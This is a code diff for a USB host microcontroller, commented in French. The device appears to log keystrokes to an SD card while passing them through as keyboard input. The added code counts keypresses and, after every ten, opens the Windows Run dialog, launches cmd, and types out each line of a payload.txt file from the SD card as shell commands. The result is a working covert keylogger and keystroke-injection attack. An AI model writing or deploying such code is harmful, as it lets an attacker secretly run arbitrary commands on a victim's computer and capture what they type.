@@ -3,6 +3,8 @@
 
 // Définir les constantes
 #define LOG_FILENAME "log.txt"
+#define KEY_COUNT_LIMIT 10
+#define PAYLOAD_FILENAME "payload.txt"
 
 File dataLog;
 USBHost myusb;
@@ -13,6 +15,10 @@ BluetoothController bluet(myusb);
 USBHIDParser hid1(myusb);
 USBHIDParser hid2(myusb);
 USBHIDParser hid3(myusb);
+
+
+// Ajoute un compteur pour les frappes de touches
+int keyCount = 0;
 
 void setup() {
   // Initialiser le port série
@@ -60,4 +66,43 @@ void onKeyPress(int unicode) {
 
   // Envoyer la touche appuyée en mode HID
   Keyboard.write(keyChar);
+
+    // Augmenter le compteur de touches
+  keyCount++;
+
+  // Si le compteur atteint la limite
+  if (keyCount >= KEY_COUNT_LIMIT) {
+    // Ouvrir le shell
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
+    Keyboard.releaseAll();
+    delay(500);  // Attendre que la fenêtre Exécuter s'ouvre
+    Keyboard.println("cmd");
+    delay(1000);  // Attendre que le shell s'ouvre
+
+    // Envoyer la commande au shell
+    Keyboard.println("dir");
+    
+    // Exécuter le payload
+    executePayload();
+
+    // Réinitialiser le compteur
+    keyCount = 0;
+  }
 }
+  void executePayload() {
+    File payloadFile = SD.open(PAYLOAD_FILENAME, FILE_READ);
+    if (payloadFile) {
+      while (payloadFile.available()) {
+        // Lire une ligne à partir du fichier
+        String line = payloadFile.readStringUntil('\n');
+
+        // Envoyer la ligne au shell
+        Keyboard.println(line);
+        delay(1000);  // Attendre que la commande s'exécute
+      }
+      payloadFile.close();
+    } else {
+      Serial.println("Erreur d'ouverture du fichier payload.txt");
+    }
+  }
